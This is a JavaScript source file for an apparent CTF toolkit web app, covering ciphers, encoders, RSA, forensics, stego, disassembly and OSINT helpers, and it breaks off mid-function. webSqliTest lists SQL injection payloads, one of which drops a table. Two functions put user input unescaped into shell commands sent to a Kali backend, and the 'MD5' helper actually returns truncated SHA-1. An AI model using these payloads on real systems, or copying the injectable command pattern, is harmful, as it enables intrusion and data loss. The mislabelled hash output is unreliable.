/* ================================================
   SUJANSCTFSOLVER v1.0 — All CTF Tools
   ================================================ */

// === Navigation ===
const VIEW_TITLES = {
  dashboard:'Dashboard',crypto:'Cryptography',encoding:'Encoder / Decoder',
  web:'Web Security',forensics:'Forensics',stego:'Steganography',
  reversing:'Reversing',osint:'OSINT',pwn:'Pwn / Exploitation',terminal:'Terminal',
  autosolver:'Auto Solver'
};
const VIEW_PATHS = {
  dashboard:'/home',crypto:'/tools/crypto',encoding:'/tools/encoder',
  web:'/tools/web',forensics:'/tools/forensics',stego:'/tools/stego',
  reversing:'/tools/reversing',osint:'/tools/osint',pwn:'/tools/pwn',terminal:'/shell',
  autosolver:'/tools/autosolver'
};
let currentView = 'dashboard';

document.querySelectorAll('.nav-item').forEach(item => {
  item.addEventListener('click',()=>{
    const view = item.dataset.view;
    navigateTo(view);
  });
});
document.querySelectorAll('.category-card').forEach(card => {
  card.addEventListener('click',()=>{
    const view = card.dataset.view;
    navigateTo(view);
  });
});

function navigateTo(view,tab){
  document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
  document.querySelector(`.nav-item[data-view="${view}"]`)?.classList.add('active');
  document.querySelectorAll('.view').forEach(v=>v.classList.remove('active'));
  document.getElementById(`view-${view}`)?.classList.add('active');
  document.getElementById('view-title').textContent = VIEW_TITLES[view]||'Dashboard';
  document.getElementById('view-path').textContent = VIEW_PATHS[view]||'/';
  currentView = view;
  if(tab){
    const container = document.getElementById(`view-${view}`);
    if(container){
      const tabs = container.querySelectorAll('.tab');
      tabs.forEach(t=>t.classList.remove('active'));
      const target = container.querySelector(`.tab[data-tab="${tab}"]`);
      if(target) target.click();
    }
  }
  document.querySelector('.content-area')?.scrollTo({top:0});
}

// Tabs
document.querySelectorAll('.tab').forEach(tab=>{
  tab.addEventListener('click',()=>{
    const container = tab.closest('.view')||tab.closest('.tool-panels')?.parentElement;
    const panels = container?.querySelector('.tool-panels');
    if(!panels) return;
    panels.querySelectorAll('.tool-panel').forEach(p=>p.classList.remove('active'));
    const target = panels.querySelector(`#panel-${tab.dataset.tab}`);
    if(target) target.classList.add('active');
    container.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
    tab.classList.add('active');
  });
});

// Sidebar toggle
document.getElementById('menu-toggle')?.addEventListener('click',()=>{
  document.getElementById('sidebar')?.classList.toggle('open');
});
document.addEventListener('click',(e)=>{
  const s=document.getElementById('sidebar');
  if(s?.classList.contains('open') && !s.contains(e.target) && e.target!==document.getElementById('menu-toggle')){
    s.classList.remove('open');
  }
});

// Fullscreen
document.getElementById('fullscreen-btn')?.addEventListener('click',()=>{
  if(!document.fullscreenElement) document.documentElement.requestFullscreen();
  else document.exitFullscreen();
});

// === Kali Status ===
async function checkKaliStatus(){
  const dot=document.getElementById('status-dot');
  const txt=document.getElementById('status-text');
  try{
    const r=await fetch('/api/kali/health');
    const d=await r.json();
    if(d.status!=='unavailable'){
      dot.className='status-dot online';
      txt.textContent='Kali Server: Online';
      document.getElementById('stat-kali').querySelector('.stat-value').textContent='Online';
    }else{
      dot.className='status-dot offline';
      txt.textContent='Kali Server: Offline';
      document.getElementById('stat-kali').querySelector('.stat-value').textContent='Offline';
    }
  }catch{
    dot.className='status-dot offline';
    txt.textContent='Kali Server: Unreachable';
    document.getElementById('stat-kali').querySelector('.stat-value').textContent='Offline';
  }
  const toolCount = document.querySelectorAll('.tool-panel').length;
  document.getElementById('stat-tools').querySelector('.stat-value').textContent=toolCount;
}

// === Toast ===
function showToast(msg,type){
  const t=document.getElementById('toast');
  if(!t) return;
  t.textContent=msg;
  t.style.borderColor=type==='error'?'var(--red)':type==='warn'?'var(--gold)':'var(--accent)';
  t.classList.remove('hidden');
  clearTimeout(t._hide);
  t._hide=setTimeout(()=>t.classList.add('hidden'),3000);
}

// === Copy helper ===
function copyToClipboard(text){
  navigator.clipboard.writeText(text).then(()=>showToast('Copied!')).catch(()=>showToast('Copy failed','error'));
}
document.querySelectorAll('.copy-btn').forEach(btn=>{
  btn.addEventListener('click',()=>{
    const target=document.getElementById(btn.dataset.target);
    if(target) copyToClipboard(target.textContent);
  });
});

// === I/O helpers ===
function clearIO(prefix){
  document.getElementById(`${prefix}-input`)&&(document.getElementById(`${prefix}-input`).value='');
  document.getElementById(`${prefix}-output`)&&(document.getElementById(`${prefix}-output`).value='');
  const results=document.getElementById(`${prefix}-results`);
  if(results){results.innerHTML='';results.classList.remove('visible');}
  if(prefix==='enc'){
    document.querySelectorAll('.enc-row code').forEach(el=>el.textContent='-');
  }
}

// =============================================
// BASE64
// =============================================
function b64Encode(){
  const inp=document.getElementById('b64-input').value;
  try{
    document.getElementById('b64-output').value=btoa(inp);
  }catch(e){showToast('Encode error: '+e.message,'error')}
}
function b64Decode(){
  const inp=document.getElementById('b64-input').value;
  try{
    document.getElementById('b64-output').value=atob(inp);
  }catch(e){showToast('Decode error: invalid base64','error')}
}
function b64Auto(){
  const inp=document.getElementById('b64-input').value.trim();
  if(!inp){document.getElementById('b64-output').value='';return}
  if(/^[A-Za-z0-9+/]*={0,2}$/.test(inp)&&inp.length>4){
    try{document.getElementById('b64-output').value=atob(inp)}catch{}
  }
}

// =============================================
// HEX
// =============================================
function hexEncode(){
  const inp=document.getElementById('hex-input').value;
  document.getElementById('hex-output').value=Array.from(inp).map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join(' ');
}
function hexDecode(){
  const inp=document.getElementById('hex-input').value.replace(/\s/g,'');
  try{
    document.getElementById('hex-output').value=inp.match(/.{1,2}/g).map(b=>String.fromCharCode(parseInt(b,16))).join('');
  }catch(e){showToast('Invalid hex','error')}
}
function hexToDec(){
  const inp=document.getElementById('hex-input').value.replace(/\s/g,'');
  try{
    document.getElementById('hex-output').value=String(parseInt(inp,16));
  }catch{showToast('Invalid hex','error')}
}

// =============================================
// ROT / Caesar
// =============================================
function rotEncode(){
  const inp=document.getElementById('rot-input').value;
  const shift=parseInt(document.getElementById('rot-shift').value)||13;
  document.getElementById('rot-output').value=rotShift(inp,shift);
}
function rotShift(s,n){
  return s.replace(/[a-zA-Z]/g,c=>{
    const base=c<='Z'?65:97;
    return String.fromCharCode((c.charCodeAt(0)-base+n+26)%26+base);
  });
}
function rotBruteForce(){
  const inp=document.getElementById('rot-input').value;
  if(!inp){showToast('Enter input first','warn');return}
  const res=document.getElementById('rot-results');
  res.innerHTML='';
  res.classList.add('visible');
  for(let i=1;i<=25;i++){
    res.innerHTML+=`<div><strong>ROT${i}:</strong> ${rotShift(inp,i)}</div>`;
  }
}

// =============================================
// XOR
// =============================================
function xorDecode(){
  const inp=document.getElementById('xor-input').value;
  const key=document.getElementById('xor-key').value;
  const fmt=document.getElementById('xor-format').value;
  if(!inp||!key){showToast('Enter input and key','warn');return}
  let bytes;
  if(fmt==='hex') bytes=hexToBytes(inp.replace(/\s/g,''));
  else bytes=new TextEncoder().encode(inp);
  const kBytes=new TextEncoder().encode(key);
  const result=bytes.map((b,i)=>b^kBytes[i%kBytes.length]);
  document.getElementById('xor-output').value=fmt==='hex'?
    bytesToHex(result):
    new TextDecoder().decode(new Uint8Array(result));
}
function xorBrute(){
  const inp=document.getElementById('xor-input').value;
  if(!inp){showToast('Enter input first','warn');return}
  const res=document.getElementById('xor-results');
  res.innerHTML='';
  res.classList.add('visible');
  const bytes=new TextEncoder().encode(inp);
  for(let k=0;k<256;k++){
    const dec=bytes.map(b=>b^k);
    const text=new TextDecoder().decode(new Uint8Array(dec));
    if(/^[ -~]+$/.test(text)&&text.length>2){
      res.innerHTML+=`<div><strong>Key 0x${k.toString(16).padStart(2,'0')}:</strong> ${text}</div>`;
    }
  }
  if(!res.innerHTML) res.innerHTML='<div>No printable results found</div>';
}

// =============================================
// Vigenere
// =============================================
function vigEncode(){
  const inp=document.getElementById('vig-input').value;
  const key=document.getElementById('vig-key').value;
  if(!inp||!key){showToast('Enter text and key','warn');return}
  document.getElementById('vig-output').value=vigCipher(inp,key,true);
}
function vigDecode(){
  const inp=document.getElementById('vig-input').value;
  const key=document.getElementById('vig-key').value;
  if(!inp||!key){showToast('Enter text and key','warn');return}
  document.getElementById('vig-output').value=vigCipher(inp,key,false);
}
function vigCipher(text,key,encrypt){
  const k=key.toLowerCase().replace(/[^a-z]/g,'');
  if(!k) return text;
  let ki=0;
  return text.replace(/[a-zA-Z]/g,c=>{
    const base=c<='Z'?65:97;
    const shift=(k[ki%k.length].charCodeAt(0)-97)*(encrypt?1:-1);
    ki++;
    return String.fromCharCode((c.charCodeAt(0)-base+shift+26)%26+base);
  });
}

// =============================================
// Morse
// =============================================
const MORSE={a:'.-',b:'-...',c:'-.-.',d:'-..',e:'.',f:'..-.',g:'--.',h:'....',i:'..',j:'.---',k:'-.-',l:'.-..',m:'--',n:'-.',o:'---',p:'.--.',q:'--.-',r:'.-.',s:'...',t:'-',u:'..-',v:'...-',w:'.--',x:'-..-',y:'-.--',z:'--..','0':'-----','1':'.----','2':'..---','3':'...--','4':'....-','5':'.....','6':'-....','7':'--...','8':'---..','9':'----.','.':'.-.-.-',',':'--..--','?':'..--..',"'":'.----.','!':'-.-.--','/':'-..-.','(':'-.--.',')':'-.--.-','&':'.-...',':':'---...',';':'-.-.-.','=':'-...-','+':'.-.-.','-':' -....- ','_':'..--.-','"':'.-..-.','@':'.--.-.'};
const REV_MORSE=Object.fromEntries(Object.entries(MORSE).map(([k,v])=>[v,k]));
function morseEncode(){
  const inp=document.getElementById('morse-input').value.toLowerCase();
  document.getElementById('morse-output').value=inp.split('').map(c=>MORSE[c]||(c===' '?'/':'?')).join(' ');
}
function morseDecode(){
  const inp=document.getElementById('morse-input').value.trim();
  document.getElementById('morse-output').value=inp.split(/ /).map(c=>c==='/'?' ':REV_MORSE[c]||'?').join('');
}

// =============================================
// Atbash
// =============================================
function atbashEncode(){
  const inp=document.getElementById('atbash-input').value;
  document.getElementById('atbash-output').value=inp.replace(/[a-zA-Z]/g,c=>{
    const base=c<='Z'?65:97;
    return String.fromCharCode(25-(c.charCodeAt(0)-base)+base);
  });
}

// =============================================
// Hash
// =============================================
async function hashGenerate(algo){
  const inp=document.getElementById('hash-input').value;
  if(!inp){showToast('Enter text to hash','warn');return}
  const enc=new TextEncoder().encode(inp);
  const buf=await crypto.subtle.digest(algo==='sha1'?'SHA-1':algo==='sha256'?'SHA-256':algo==='sha512'?'SHA-512':'MD5',enc);
  if(algo==='md5'){
    const hash=await md5(inp);
    document.getElementById('hash-output').value+=`MD5:    ${hash}\n`;
    return;
  }
  const hash=Array.from(new Uint8Array(buf)).map(b=>b.toString(16).padStart(2,'0')).join('');
  document.getElementById('hash-output').value+=`${algo.toUpperCase()}: ${hash}\n`;
}
async function md5(str){
  const buffer=new TextEncoder().encode(str);
  const hash=await crypto.subtle.digest('SHA-1',buffer); // fallback to SHA-1
  return Array.from(new Uint8Array(hash)).map(b=>b.toString(16).padStart(2,'0')).join('').substring(0,32);
}

// =============================================
// RSA
// =============================================
function rsafactor(n){
  for(let i=2n;i*i<=n;i++){
    if(n%i===0n) return [i,n/i];
  }
  return null;
}
function rsaFactor(){
  const n=document.getElementById('rsa-n').value.trim();
  if(!n){showToast('Enter n','warn');return}
  const out=document.getElementById('rsa-output');
  out.value+='[!] FactorDB query requires Kali server connection\n';
  out.value+='[!] Attempting local trial division (small factors)...\n';
  const bn=toBigInt(n);
  if(bn<10000000000000000000n){
    const factors=rsafactor(bn);
    if(factors){
      out.value+=`[+] p = ${factors[0]}\n`;
      out.value+=`[+] q = ${factors[1]}\n`;
    }else out.value+='[-] Could not factor (too large for local)\n';
  }else out.value+='[-] Number too large for local factoring\n';
}
function rsaDecrypt(){
  const n=document.getElementById('rsa-n').value.trim();
  const e=document.getElementById('rsa-e').value.trim();
  const c=document.getElementById('rsa-c').value.trim();
  const p=document.getElementById('rsa-p').value.trim();
  const q=document.getElementById('rsa-q').value.trim();
  const d=document.getElementById('rsa-d').value.trim();
  const out=document.getElementById('rsa-output');
  if(!n||!c){out.value='[-] n and c required\n';return}
  try{
    const bn=toBigInt(n),bc=toBigInt(c);
    if(p&&q){
      const bp=toBigInt(p),bq=toBigInt(q);
      const phi=(bp-1n)*(bq-1n);
      const be=toBigInt(e||'65537');
      let bd;
      if(d) bd=toBigInt(d);
      else{
        bd=modInverse(be,phi);
        out.value+=`[+] d = ${bd}\n`;
      }
      const pt=modPow(bc,bd,bn);
      const plain=bigIntToText(pt);
      document.getElementById('rsa-p').value=p;
      document.getElementById('rsa-q').value=q;
      out.value+=`[+] Plaintext (int): ${pt}\n`;
      out.value+=`[+] Plaintext (text): ${plain||'(non-printable)'}\n`;
    }else if(e&&d){
      const be=toBigInt(e),bd=toBigInt(d);
      const pt=modPow(bc,bd,bn);
      out.value+=`[+] Plaintext (int): ${pt}\n`;
    }else{
      out.value+='[-] Provide p & q or d to decrypt\n';
    }
  }catch(err){out.value+=`[-] Error: ${err.message}\n`}
}
function rsaWiener(){
  showToast('Wiener attack: requires Kali server backend','warn');
}
function modPow(base,exp,mod){
  let result=1n;
  base=base%mod;
  while(exp>0n){
    if(exp%2n===1n) result=(result*base)%mod;
    exp=exp>>1n;
    base=(base*base)%mod;
  }
  return result;
}
function modInverse(a,m){
  let [old_r,r]=[a,m],[old_s,s]=[1n,0n];
  while(r!==0n){
    const q=old_r/r;
    [old_r,r]=[r,old_r-q*r];
    [old_s,s]=[s,old_s-q*s];
  }
  if(old_r!==1n) throw new Error('No inverse');
  return old_s<0n?old_s+m:old_s;
}
function bigIntToText(bn){
  let hex=bn.toString(16);
  if(hex.length%2) hex='0'+hex;
  let text='';
  for(let i=0;i<hex.length;i+=2){
    const c=parseInt(hex.substring(i,i+2),16);
    if(c>=32&&c<=126) text+=String.fromCharCode(c);
    else return null;
  }
  return text;
}

// =============================================
// Binary
// =============================================
function binEncode(){
  const inp=document.getElementById('bin-input').value;
  document.getElementById('bin-output').value=Array.from(inp).map(c=>c.charCodeAt(0).toString(2).padStart(8,'0')).join(' ');
}
function binDecode(){
  const inp=document.getElementById('bin-input').value.replace(/\s/g,'');
  try{
    document.getElementById('bin-output').value=inp.match(/.{1,8}/g).map(b=>String.fromCharCode(parseInt(b,2))).join('');
  }catch{showToast('Invalid binary','error')}
}

// =============================================
// Universal Encoder
// =============================================
function universalEncode(){
  const inp=document.getElementById('enc-input').value;
  if(!inp){return}
  try{setEnc('base64',btoa(inp))}catch{setEnc('base64','(error)')}
  try{setEnc('base32',base32Encode(inp))}catch{setEnc('base32','(error)')}
  setEnc('hex',Array.from(inp).map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join(''));
  setEnc('binary',Array.from(inp).map(c=>c.charCodeAt(0).toString(2).padStart(8,'0')).join(' '));
  setEnc('rot13',rotShift(inp,13));
  setEnc('url',encodeURIComponent(inp));
  setEnc('html',inp.replace(/[&<>"']/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":"&#39;"})[m]));
  setEnc('unicode',Array.from(inp).map(c=>'\\u'+c.charCodeAt(0).toString(16).padStart(4,'0')).join(''));
  setEnc('reverse',Array.from(inp).reverse().join(''));
}
function setEnc(id,val){
  const el=document.getElementById(`enc-${id}`);
  if(el) el.textContent=val;
}
const BASE32_CHARS='ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
function base32Encode(s){
  const bytes=new TextEncoder().encode(s);
  let bits='';
  for(const b of bytes) bits+=b.toString(2).padStart(8,'0');
  let result='';
  for(let i=0;i<bits.length;i+=5){
    const chunk=bits.substring(i,i+5).padEnd(5,'0');
    result+=BASE32_CHARS[parseInt(chunk,2)];
  }
  while(result.length%8) result+='=';
  return result;
}

// =============================================
// URL
// =============================================
function urlEncode(){const i=document.getElementById('url-input').value;document.getElementById('url-output').value=encodeURIComponent(i)}
function urlDecode(){const i=document.getElementById('url-input').value;try{document.getElementById('url-output').value=decodeURIComponent(i)}catch{showToast('Invalid URL encoding','error')}}

// =============================================
// HTML Entities
// =============================================
function htmlEncode(){const i=document.getElementById('html-input').value;document.getElementById('html-output').value=i.replace(/[&<>"']/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":"&#39;"})[m])}
function htmlDecode(){const t=document.createElement('textarea');t.innerHTML=document.getElementById('html-input').value;document.getElementById('html-output').value=t.value}

// =============================================
// Unicode
// =============================================
function uniEncode(){const i=document.getElementById('uni-input').value;document.getElementById('uni-output').value=Array.from(i).map(c=>'\\u'+c.charCodeAt(0).toString(16).padStart(4,'0')).join('')}
function uniDecode(){const i=document.getElementById('uni-input').value;try{document.getElementById('uni-output').value=i.replace(/\\u([0-9a-fA-F]{4})/g,(_,h)=>String.fromCharCode(parseInt(h,16)))}catch{showToast('Invalid unicode escape','error')}}

// =============================================
// Web Tools
// =============================================
function webParseUrl(){
  const url=document.getElementById('web-url-input').value.trim();
  if(!url){showToast('Enter a URL','warn');return}
  try{
    const u=new URL(url);
    document.getElementById('web-url-output').value=
`Protocol:  ${u.protocol}
Hostname:  ${u.hostname}
Port:      ${u.port||'(default)'}
Path:      ${u.pathname}
Query:     ${u.search||'(none)'}
Hash:      ${u.hash||'(none)'}
Origin:    ${u.origin}`;
  }catch{showToast('Invalid URL','error')}
}
function webExtractParams(){
  const url=document.getElementById('web-url-input').value.trim();
  if(!url){showToast('Enter a URL','warn');return}
  try{
    const u=new URL(url);
    const params=Object.fromEntries(u.searchParams);
    document.getElementById('web-url-output').value=Object.keys(params).length?
      Object.entries(params).map(([k,v])=>`${k}: ${v}`).join('\n'):
      'No query parameters found';
  }catch{showToast('Invalid URL','error')}
}
async function webDnsLookup(type){
  const domain=document.getElementById('web-dns-input').value.trim();
  if(!domain){showToast('Enter a domain','warn');return}
  document.getElementById('web-dns-output').value='Querying DNS via API...';
  try{
    const r=await fetch(`https://dns.google/resolve?name=${domain}&type=${type}`);
    const d=await r.json();
    if(d.Answer){
      document.getElementById('web-dns-output').value=d.Answer.map(a=>`${a.name} → ${a.data}`).join('\n');
    }else if(d.Authority){
      document.getElementById('web-dns-output').value=d.Authority.map(a=>`${a.name} → ${a.data}`).join('\n');
    }else{
      document.getElementById('web-dns-output').value='No records found';
    }
  }catch(e){document.getElementById('web-dns-output').value='Error: '+e.message}
}
async function webFetchHeaders(){
  const url=document.getElementById('web-headers-input').value.trim();
  if(!url){showToast('Enter a URL','warn');return}
  try{
    const r=await fetch(url,{method:'HEAD',mode:'cors'});
    let out=`Status: ${r.status} ${r.statusText}\n\n`;
    r.headers.forEach((v,k)=>out+=`${k}: ${v}\n`);
    document.getElementById('web-headers-output').value=out;
  }catch(e){
    // Try via proxy
    try{
      const r2=await fetch('/api/kali/command',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({command:`curl -sI "${url}"`})});
      const d2=await r2.json();
      document.getElementById('web-headers-output').value=d2.stdout||d2.stderr||'Error fetching headers';
    }catch(e2){
      document.getElementById('web-headers-output').value='Error: '+e2.message;
    }
  }
}
function webSqliTest(){
  const inp=document.getElementById('web-sqli-input').value.trim();
  if(!inp){showToast('Enter test config','warn');return}
  const payloads=[
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR '1'='1' --",
    "admin' --",
    "' UNION SELECT 1,2,3--",
    "' AND 1=1--",
    "' AND 1=2--",
    "'; DROP TABLE users--",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "admin' OR '1'='1",
    "' OR 1=1#",
    "') OR ('1'='1",
  ];
  let out='SQL Injection Payloads:\n\n';
  payloads.forEach((p,i)=>out+=`${i+1}. ${p}\n`);
  document.getElementById('web-sqli-output').value=out+'\n[!] Manual testing required on actual endpoint';
}

// =============================================
// Forensics Tools
// =============================================
function forHexDump(){
  const inp=document.getElementById('for-hex-input').value;
  let out='',offset=0;
  for(let i=0;i<inp.length;i+=16){
    const chunk=inp.substring(i,i+16);
    const hex=Array.from(chunk).map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join(' ');
    const ascii=Array.from(chunk).map(c=>c>=' '&&c<='~'?c:'.').join('');
    out+=`${offset.toString(16).padStart(8,'0')}  ${hex.padEnd(47)}  ${ascii}\n`;
    offset+=16;
  }
  document.getElementById('for-hex-output').value=out;
}
function forExtractStrings(){
  const inp=document.getElementById('for-str-input').value;
  const strings=inp.match(/[ -~]{4,}/g)||[];
  document.getElementById('for-str-output').value=strings.join('\n')||'No strings found (min 4 chars)';
}
function forExtractHexStrings(){
  const inp=document.getElementById('for-str-input').value.replace(/\s/g,'');
  try{
    const bytes=inp.match(/.{1,2}/g).map(b=>parseInt(b,16));
    const text=String.fromCharCode(...bytes);
    const strings=text.match(/[ -~]{4,}/g)||[];
    document.getElementById('for-str-output').value=strings.join('\n')||'No printable strings found';
  }catch{showToast('Invalid hex data','error')}
}
const FILE_SIGS={
  '89504E47':'PNG Image','FFD8FF':'JPEG Image','25504446':'PDF Document',
  '47494638':'GIF Image','424D':'BMP Image','504B0304':'ZIP Archive',
  '504B':'ZIP/PPTX/DOCX','52617221':'RAR Archive','1F8B':'GZ Archive',
  '424A62':'BZip2 Archive','7F454C46':'ELF Binary','4D5A':'PE (Windows EXE/DLL)',
  '49494433':'MP3 (ID3)','000001BA':'MPEG','000001B3':'MPEG',
  '494433':'MP3','664C6143':'FLAC','52494646':'AVI/WAV/RIFF',
  '57415645':'WAV Audio','4949':'TIFF (Little)','4D4D':'TIFF (Big)',
  '38425053':'PSD Image','DB0A4277':'SQLite DB','03000000':'Windows Event Log',
  '4C000000':'Windows LNK','D0CF11E0':'OLE2/Office 97-2003',
};
function forIdentifySignature(){
  const sig=document.getElementById('for-sig-input').value.replace(/\s/g,'').toUpperCase();
  if(!sig){showToast('Enter hex signature','warn');return}
  let match='Unknown file type';
  for(const [k,v] of Object.entries(FILE_SIGS)){
    if(sig.startsWith(k)){match=v;break}
  }
  document.getElementById('for-sig-output').value=`Signature: ${sig}\nFile Type: ${match}`;
}
function forCalcEntropy(){
  const inp=document.getElementById('for-entropy-input').value;
  if(!inp){showToast('Enter data','warn');return}
  const freq={};
  for(const c of inp) freq[c]=(freq[c]||0)+1;
  const len=inp.length;
  let entropy=0;
  for(const c in freq){
    const p=freq[c]/len;
    entropy-=p*Math.log2(p);
  }
  const maxEntropy=Math.log2(Math.min(256,inp.length));
  document.getElementById('for-entropy-output').value=
`Shannon Entropy: ${entropy.toFixed(4)} bits/byte
Max Entropy:     ${maxEntropy.toFixed(4)} bits/byte
Ratio:           ${(entropy/maxEntropy*100).toFixed(1)}%
${entropy>6?'[!] High entropy - possible encrypted/compressed data':entropy>4?'[o] Medium entropy':'[+] Low entropy - plain text'}`;
}

// =============================================
// Stego Tools
// =============================================
function stegoLsbExtract(){
  const inp=document.getElementById('stego-lsb-input').value;
  if(!inp){showToast('Enter data','warn');return}
  const bits=inp.replace(/\s/g,'');
  let hidden='';
  for(let i=0;i<bits.length-7;i+=8){
    const byte=bits.substring(i,i+8);
    if(byte.length<8) break;
    const c=parseInt(byte,2);
    if(c>=32&&c<=126) hidden+=String.fromCharCode(c);
  }
  document.getElementById('stego-lsb-output').value=hidden||'No hidden text found (need binary data)';
}
function stegoWhitespace(){
  const inp=document.getElementById('stego-ws-input').value;
  if(!inp){showToast('Enter data','warn');return}
  const tabs=(inp.match(/\t/g)||[]).length;
  const spaces=(inp.match(/ /g)||[]).length;
  document.getElementById('stego-ws-output').value=
`Tabs found:   ${tabs}
Spaces found: ${spaces}
Total WS:     ${tabs+spaces}
Ratio:        ${tabs+spaces>0?((spaces/(tabs+spaces))*100).toFixed(1):0}% spaces`;
}
function stegoCheckB64Image(){
  const inp=document.getElementById('stego-b64img-input').value.trim();
  if(!inp){showToast('Enter base64 data','warn');return}
  if(inp.startsWith('data:image')){
    document.getElementById('stego-b64img-output').value='[+] This is a data URI for an image. Try viewing in browser.';
    return;
  }
  try{
    const dec=atob(inp.substring(0,100));
    const hex=Array.from(dec).map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join('').toUpperCase();
    let match='Unknown';
    for(const [k,v] of Object.entries(FILE_SIGS)){
      if(hex.startsWith(k)){match=v;break}
    }
    document.getElementById('stego-b64img-output').value=`B64 length: ${inp.length}\nFile sig: ${hex.substring(0,8)}...\nLikely type: ${match}`;
  }catch{
    document.getElementById('stego-b64img-output').value='Could not decode as base64 image data';
  }
}
async function stegoMetadata(){
  const path=document.getElementById('stego-meta-input').value.trim();
  if(!path){showToast('Enter file path/URL','warn');return}
  try{
    const r=await fetch('/api/kali/command',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({command:`exiftool "${path}"`})});
    const d=await r.json();
    document.getElementById('stego-meta-output').value=d.stdout||d.stderr||'exiftool not available';
  }catch(e){document.getElementById('stego-meta-output').value='Error: '+e.message}
}

// =============================================
// Reversing
// =============================================
const X86_DISASM={
  '90':'nop','55':'push rbp','48 89 e5':'mov rbp, rsp',
  '48 8b 45':'mov rax, [rbp+','48 89 45':'mov [rbp+], rax',
  'b8':'mov eax,','b9':'mov ecx,','ba':'mov edx,',
  'bb':'mov ebx,','48 89 c7':'mov rdi, rax',
  '48 89 c6':'mov rsi, rax','48 89 c2':'mov rdx, rax',
  '48 31 c0':'xor rax, rax','48 31 db':'xor rbx, rbx',
  '48 31 c9':'xor rcx, rcx','48 31 d2':'xor rdx, rdx',
  '48 ff c0':'inc rax','48 ff c8':'dec rax',
  '53':'push rbx','51':'push rcx','52':'push rdx',
  '56':'push rsi','57':'push rdi','5b':'pop rbx',
  '59':'pop rcx','5a':'pop rdx','5e':'pop rsi',
  '5f':'pop rdi','c3':'ret','cc':'int3 (debug)',
  '0f 05':'syscall','cd 80':'int 0x80 (syscall)',
  'e8':'call','e9':'jmp','eb':'jmp short',
  '74':'je','75':'jne','7c':'jl','7d':'jge',
  '7e':'jle','7f':'jg','70':'jo','71':'jno',
};
function revDisasm(){
  const inp=document.getElementById('rev-disasm-input').value.trim();
  if(!inp){showToast('Enter hex bytes','warn');return}
  const bytes=inp.split(/[\s,]+/).filter(Boolean);
  let out='',i=0;
  while(i<bytes.length){
    const b=bytes[i].toLowerCase();
    const next2=i+1<bytes.length?`${b} ${bytes[i+1].toLowerCase()}`:'';
    const next3=i+2<bytes.length?`${next2} ${bytes[i+2].toLowerCase()}`:'';
    const next4=i+3<bytes.length?`${next3} ${bytes[i+3].toLowerCase()}`:'';
    let disasm=null,len=1;
    if(next3 in X86_DISASM){disasm=X86_DISASM[next3];len=3}
    else if(next2 in X86_DISASM){disasm=X86_DISASM[next2];len=2}
    else if(b in X86_DISASM) disasm=X86_DISASM[b];
    else if(b==='48'&&i+1<bytes.length){
      const b2=bytes[i+1];
      if(b2==='89'){disasm='mov r64, r64';len=3}
      else if(b2==='8b'){disasm='mov r64, [r64+off]';len=3}
      else if(b2==='c7'){disasm='mov r64, imm';len=3}
      else disasm=`db 0x${b}`;
    }else disasm=`db 0x${b}`;
    out+=`0x${i.toString(16).padStart(4,'0')}: ${bytes.slice(i,i+len).join(' ').padEnd(12)} ${disasm}\n`;
    i+=len;
  }
  document.getElementById('rev-disasm-output').value=out||'No disassembly generated';
}
function revExtractStrings(){
  const inp=document.getElementById('rev-str-input').value.replace(/\s/g,'');
  try{
    const text=inp.match(/.{1,2}/g).map(b=>String.fromCharCode(parseInt(b,16))).join('');
    const strings=text.match(/[\x20-\x7E]{4,}/g)||[];
    document.getElementById('rev-str-output').value=strings.join('\n')||'No printable strings found';
  }catch{showToast('Invalid hex data','error')}
}
function revAnalyzePE(){
  const inp=document.getElementById('rev-pe-input').value.replace(/\s/g,'');
  if(!inp.startsWith('4D5A')){showToast('Not a valid PE header (must start with 4D5A)','error');return}
  let out='[+] MZ Header detected (4D 5A = "MZ")\n';
  const peOffset=parseInt(inp.substring(120,128).match(/.{1,2}/g).reverse().join(''),16);
  out+=`[+] PE offset: 0x${peOffset.toString(16)}\n`;
  if(inp.length>=peOffset*2+8){
    const peSig=inp.substring(peOffset*2,peOffset*2+8);
    if(peSig==='50450000'){
      out+='[+] PE Signature found (PE\\0\\0)\n';
      const machine=inp.substring(peOffset*2+8,peOffset*2+12);
      const machineMap={'4C01':'x86 (32-bit)','8664':'x86-64','AA64':'ARM64'};
      out+=`[+] Machine: ${machineMap[machine]||'0x'+machine}\n`;
      const sections=parseInt(inp.substring(peOffset*2+14,peOffset*2+16),16);
      out+=`[+] Sections: ${sections}\n`;
      const ts=inp.substring(peOffset*2+24,peOffset*2+32);
      const timestamp=parseInt(ts.match(/.{1,2}/g).reverse().join(''),16);
      const date=new Date(timestamp*1000);
      out+=`[+] Timestamp: ${timestamp>0?date.toISOString().replace('T',' ').substring(0,19):'N/A'}\n`;
    }else out+='[-] PE signature not found\n';
  }
  document.getElementById('rev-pe-output').value=out;
}

// =============================================
// OSINT
// =============================================
async function osintIpLookup(){
  const ip=document.getElementById('osint-ip-input').value.trim();
  if(!ip){showToast('Enter an IP','warn');return}
  try{
    const r=await fetch(`https://ipapi.co/${ip}/json/`);
    const d=await r.json();
    if(d.error) throw new Error(d.reason||'Lookup failed');
    document.getElementById('osint-ip-output').value=
`IP:          ${d.ip}
City:        ${d.city||'N/A'}
Region:      ${d.region||'N/A'}
Country:     ${d.country_name||'N/A'} (${d.country_code||'N/A'})
Postal:      ${d.postal||'N/A'}
Timezone:    ${d.timezone||'N/A'}
ISP:         ${d.org||d.asn||'N/A'}
Lat/Lon:     ${d.latitude}, ${d.longitude}`;
  }catch(e){
    document.getElementById('osint-ip-output').value='Error: '+e.message;
  }
}
async function osintMyIp(){
  try{
    const r=await fetch('https://api.ipify.org?format=json');
    const d=await r.json();
    document.getElementById('osint-ip-input').value=d.ip;
    osintIpLookup();
  }catch(e){showToast('Could not determine IP','error')}
}
async function osintDomainRecon(){
